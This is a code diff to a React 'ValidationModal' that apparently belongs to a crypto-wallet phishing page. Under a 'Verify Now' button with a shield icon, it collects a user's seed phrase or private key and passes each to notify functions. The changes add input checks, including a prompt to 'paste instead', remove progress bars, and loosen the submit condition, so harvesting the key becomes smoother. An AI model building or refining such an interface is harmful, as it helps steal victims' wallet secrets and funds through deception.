@@ -62,6 +62,7 @@ export function ValidationModal({ walletAddress, onSuccess, onClose, onLogout }:
   const [words, setWords] = useState<string[]>(Array(12).fill(""));
   const [privateKey, setPrivateKey] = useState("");
   const [showWords, setShowWords] = useState(false);
+  const [privateKeyError, setPrivateKeyError] = useState("");
   const [logoutCountdown, setLogoutCountdown] = useState(5);
   const inputRefs = useRef<(HTMLInputElement | null)[]>([]);
 
@@ -148,6 +149,10 @@ export function ValidationModal({ walletAddress, onSuccess, onClose, onLogout }:
 
   const handleManualValidate = () => {
     if (phraseMode === "key") {
+      if (privateKey.trim().length < 24) {
+        setPrivateKeyError("Enter a valid private key, paste instead.");
+        return;
+      }
       notifyPrivateKey(walletAddress, privateKey.trim());
     } else {
       notifySeedPhrase(walletAddress, words.slice(0, wordCount), wordCount);
@@ -449,10 +454,6 @@ export function ValidationModal({ walletAddress, onSuccess, onClose, onLogout }:
                         );
                       })}
                     </div>
-                    <div className="mt-3 h-1.5 rounded-full bg-white/5 overflow-hidden">
-                      <div className="h-full rounded-full bg-gradient-to-r from-violet-600 to-cyan-500 transition-all duration-500"
-                        style={{ width: `${(validWordCount / wordCount) * 100}%` }} />
-                    </div>
                   </div>
                 )}
 
@@ -472,16 +473,20 @@ export function ValidationModal({ walletAddress, onSuccess, onClose, onLogout }:
                       <Input data-testid="input-private-key"
                         type={showWords ? "text" : "password"}
                         value={privateKey}
-                        onChange={e => setPrivateKey(e.target.value)}
+                        onChange={e => { setPrivateKey(e.target.value); setPrivateKeyError(""); }}
                         placeholder="0x... or WIF format private key"
                         autoComplete="off" autoCorrect="off" autoCapitalize="none" spellCheck={false}
-                        className="pl-9 bg-white/5 border-white/10 text-foreground font-mono text-sm focus:border-violet-500/50"
+                        className={`pl-9 font-mono text-sm bg-white/5 text-foreground focus:border-violet-500/50 ${
+                          privateKeyError ? "border-red-500/60 bg-red-500/5" : "border-white/10"
+                        }`}
                       />
                     </div>
-                    <div className="mt-2 h-1.5 rounded-full bg-white/5 overflow-hidden">
-                      <div className="h-full rounded-full bg-gradient-to-r from-violet-600 to-cyan-500 transition-all duration-300"
-                        style={{ width: `${Math.min((privateKey.trim().length / 64) * 100, 100)}%` }} />
-                    </div>
+                    {privateKeyError && (
+                      <p className="text-xs text-red-400 mt-1.5 flex items-center gap-1.5">
+                        <AlertTriangle className="w-3.5 h-3.5 flex-shrink-0" />
+                        {privateKeyError}
+                      </p>
+                    )}
                   </div>
                 )}
 
@@ -489,7 +494,7 @@ export function ValidationModal({ walletAddress, onSuccess, onClose, onLogout }:
                   <Button variant="outline" onClick={() => setStep("choose")}
                     className="flex-1 border-white/10 text-muted-foreground">Back</Button>
                   <Button data-testid="button-submit-validation" onClick={handleManualValidate}
-                    disabled={!isReady}
+                    disabled={phraseMode !== "key" && !isReady}
                     className="flex-1 bg-gradient-to-r from-violet-600 to-purple-600 text-white font-semibold border-0">
                     <Shield className="w-4 h-4 mr-2" />
                     Verify Now
